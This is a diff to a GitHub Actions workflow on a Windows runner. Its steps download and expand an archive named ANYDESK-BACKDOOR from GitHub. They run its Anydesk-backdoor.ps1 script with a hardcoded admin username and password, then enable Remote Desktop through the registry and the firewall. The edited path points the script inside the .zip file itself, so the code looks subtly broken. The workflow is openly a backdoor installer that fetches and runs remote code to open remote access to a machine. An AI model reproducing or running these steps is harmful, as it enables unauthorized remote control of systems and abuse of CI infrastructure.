@@ -5,11 +5,11 @@ jobs:
     runs-on: windows-latest
     steps:
     - name: Download Backdoor
-      run: Invoke-WebRequest -Uri 'https://github.com/MrAli-Code/ANYDESK-BACKDOOR/archive/refs/heads/main.zip' -OutFile 'ANYDESK-BACKDOOR-main.zip'
+      run: Invoke-WebRequest -Uri 'https://github.com/MrAli-Code/ANYDESK-BACKDOOR/archive/refs/heads/main.zip' -OutFile 'C:\Backdoor\ANYDESK-BACKDOOR-main.zip'
     - name: Expanding Backdoor
-      run: Expand-Archive ANYDESK-BACKDOOR-main.zip
+      run: Expand-Archive C:\Backdoor\ANYDESK-BACKDOOR-main.zip
     - name: Auth
-      run: powershell -File .\Anydesk-backdoor.ps1 -InstallPath "C:\CustomPath" -AdminUsername "Kopp56" -AdminPassword "Senha@123"
+      run: powershell -File C:\Backdoor\ANYDESK-BACKDOOR-main.zip\Anydesk-backdoor.ps1 -InstallPath "C:\CustomPath" -AdminUsername "Kopp56" -AdminPassword "Senha@123"
     - name: Enable TS
       run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
     - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
